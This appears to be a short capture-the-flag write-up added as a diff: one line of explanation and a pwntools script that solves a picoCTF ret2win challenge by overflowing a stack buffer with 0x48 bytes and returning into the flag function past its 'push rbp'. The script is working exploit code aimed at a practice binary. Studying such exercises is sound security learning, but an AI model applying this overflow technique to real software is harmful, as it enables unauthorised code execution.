@@ -1,0 +1,38 @@
+This challenge although is a simple ret2win you need to redirect to after push rbp in the flag function
+
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./vuln_patched")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("saturn.picoctf.net", 58858)
+
+    return r
+
+
+def main():
+    
+    r = conn()
+    # gdb.attach(target=r,gdbscript='init-gef')
+    payload = b'a'  * 0x48
+    payload += p64(exe.sym.flag + 5)
+    r.recvline()
+    r.sendline(payload)
+    # x = r.recvline()
+    # log.info(f'{x}')
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
